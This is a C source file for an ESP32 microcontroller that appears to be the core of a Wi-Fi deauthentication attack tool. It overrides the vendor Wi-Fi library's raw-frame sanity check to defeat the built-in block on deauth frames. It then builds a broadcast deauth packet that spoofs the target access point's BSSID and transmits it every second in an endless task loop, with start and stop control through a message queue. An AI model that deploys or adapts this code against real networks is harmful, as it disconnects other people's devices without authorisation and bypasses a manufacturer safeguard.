/*
 * attack_wifi.c
 *
 *  Created on: Oct 22, 2023
 *      Author: Atieq
 */

#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "freertos/queue.h"
#include "lwip/err.h"
#include "lwip/sys.h"


#include "attack.h"
#include "scan_wifi.h"
#include "webserver.h"

QueueHandle_t WiFi_Attack_Queue;

TaskHandle_t taskHandle;
TaskHandle_t taskHandle1;

int flag = 0;

/**
 * Note: this is only defined to overwrite the wifi stack Libaray which stops the deauth packet to be send.
 * we jsut need to define it and not call it. and please see the README.md to view the flag that are requied with it.
*/
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}


void send_Deauth(uint8_t *bssid)
{

	uint8_t deauth_packet[26] ={
			0xc0, 0x00, 0x3a, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,	// target mac  my pc
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // source (ap) network
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	// bssid (ap)
    0xf0, 0xff, 0x01, 0x00
	};

    // 0xE8, 0x65, 0xD4, 0x59, 0xD3, 0x28
    //0x00, 0x00, 0x00, 0x00, 0x00, 0x00

	memcpy(&deauth_packet[10], bssid, 6);
	memcpy(&deauth_packet[16], bssid, 6);

	esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
    for (size_t i = 0; i < sizeof(deauth_packet) / sizeof(deauth_packet[0]); i++) {
        printf("%02X ", deauth_packet[i]);
    }

    printf("\n");
	ESP_LOGI("DEAUTH", "The deauth packet is started....");
}

void deauth_task() {

    ESP_ERROR_CHECK(esp_wifi_stop());
     wifi_config_t ap_config ={
		.ap = {
			.ssid = WIFI_AP_SSID,
			.ssid_len = strlen(WIFI_AP_SSID),
            .channel = STA_CHANNEL,
            .password = WIFI_AP_PASSWORD,
            .max_connection = WIFI_AP_MAX_CONNECTIONS,
            .authmode = WIFI_AUTH_WPA_WPA2_PSK
		},
	};
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    vTaskDelay(2000 / portTICK_PERIOD_MS);
    esp_wifi_set_promiscuous(true);

    while (1) {

        // for BSSID
        uint8_t bssid[6];
        memcpy(bssid, bssid_attack, 6);

        
        send_Deauth(bssid);
        vTaskDelay(1000 / portTICK_PERIOD_MS);
    }
}

void attack_stop()
{
    vTaskSuspend(taskHandle);
    vTaskDelete(taskHandle);
    taskHandle = NULL; // Add this line to set the task handle to NULL after deletion
    esp_wifi_set_promiscuous(false);
    wifi_attack_send_massage(WIFI_SCAN_RESTART);
}

BaseType_t wifi_attack_send_massage(wifi_attack_message_e msgID)
{
	wifi_attack_message_t msg;
	msg.msgID = msgID;
	return xQueueSend(WiFi_Attack_Queue, &msg, portMAX_DELAY);
}

void Wifi_attack_func()
{
   wifi_attack_message_t receivedMessage;
    while (1)
    {
        if (xQueueReceive(WiFi_Attack_Queue, &receivedMessage, portMAX_DELAY)) {
            switch(receivedMessage.msgID) {
                case WIFI_ATTACK_START:
                    xTaskCreate(
                        deauth_task,
                        "Deauth",
                        WIFI_ATTACK_STACK_SIZE,   	// Stack size (in words, not bytes!)
	                    NULL,                   		// Task parameter
			            6,     // Priority (higher number means higher priority)
	                    &taskHandle
                    );
        			break;
                case WIFI_ATTACK_STOP:
                    attack_stop();
                    break;
                
                case WIFI_SCAN_RESTART:
                wifi_task_scan();
               
                break;

                case WIFI_ATTACK_TASK_STOP:
                vTaskSuspend(taskHandle1);
                vTaskDelete(taskHandle1);
                taskHandle1 = NULL; // Add this line to set the task handle to NULL after deletion
                break;

                default:
                    break;
				}
			}
        // wifi_app_send_massage(WIFI_MSG_SCAN_START);
		ESP_LOGI("ATTACK", "this is attack loop is stopping.....");
		vTaskDelay(1000 / portTICK_PERIOD_MS);
    }
    

}

void wifi_attack()
{
    taskHandle1 = NULL;
    WiFi_Attack_Queue = xQueueCreate(3, sizeof(QueueHandle_t));
	xTaskCreatePinnedToCore(
			Wifi_attack_func,         		// Task function
	        "HTTP_server_task",         	// Name of the task (for debugging purposes)
			WIFI_ATTACK_STACK_SIZE,   	// Stack size (in words, not bytes!)
	        NULL,                   		// Task parameter
			WIFI_ATTACK_PRIORITY,     // Priority (higher number means higher priority)
	        taskHandle1,                    		// Task handle (not needed here, so set to NULL)
			WIFI_ATTACK_CORE_ID		//
	    );
     // Initialize taskHandle to NULL
    taskHandle = NULL;

    wifi_attack_send_massage(WIFI_ATTACK_START);
    Wifi_attack_func();
    
}